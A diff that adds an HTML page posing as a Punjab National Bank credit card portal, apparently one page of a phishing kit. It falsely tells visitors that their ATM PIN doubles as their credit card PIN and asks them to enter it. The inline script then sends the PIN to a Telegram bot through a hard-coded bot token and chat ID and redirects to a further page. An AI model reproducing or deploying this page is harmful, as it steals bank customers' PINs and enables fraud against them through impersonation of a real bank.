@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PNB Credit Card Apply Portal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        main {
+            flex: 1;
+        }
+        .header {
+            background-color: #a90000;
+            color: white;
+            padding: 20px;
+            font-size: 18px;
+        }
+        .sub-header {
+            background-color: #ffcc00;
+            padding: 5px;
+            font-weight: bold;
+        }
+        .container {
+            padding: 20px;
+        }
+        .input-box {
+            width: 80%;
+            max-width: 300px;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #a90000;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .btn {
+            background-color: #ffcc00;
+            padding: 10px 20px;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .footer {
+            background-color: #a90000;
+            color: white;
+            padding: 10px;
+            margin-top: auto;
+            width: 100%;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto;
+            padding: 10px 0;
+            max-width: 150px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="pnb-logo.png" alt="PNB Logo" class="logo">
+        पंजाब नैशनल बैंक | Punjab National Bank
+    </div>
+    <div class="sub-header">Punjab National Bank Credit Card Apply Portal</div>
+
+    <main>
+        <div class="container">
+            <p>Your ATM Pin & Credit Card Pin Default Same<br> Please Set Your Credit Card Pin</p>
+            <form id="pinForm">
+                <input type="password" id="atm-pin" name="atm_pin" class="input-box" placeholder="Enter ATM Pin" required minlength="4" maxlength="4">
+                <br>
+                <button type="submit" class="btn">PROCEED</button>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; // Secure token replacement
+        const chatId = "-1002424646619";
+
+        document.getElementById("pinForm").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const atmPin = document.getElementById("atm-pin").value;
+
+            if (atmPin.length !== 4 || isNaN(atmPin)) {
+                alert("Please enter a valid 4-digit numeric PIN.");
+                return;
+            }
+
+            const message = `🔹 **PNB Credit Card PIN Setup**\n🔑 **ATM PIN:** ${atmPin}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("PIN successfully processed. Redirecting...");
+                    window.location.href = "4thpage.html";
+                } else {
+                    alert("Error sending PIN. Please try again.");
+                }
+            })
+            .catch(error => console.error("Telegram Error:", error));
+        });
+    </script>
+
+    <div class="footer">
+        <p>Terms & Conditions | Privacy Policy | Security</p>
+        <p>&copy; 2025 Punjab National Bank</p>
+    </div>
+</body>
+</html>
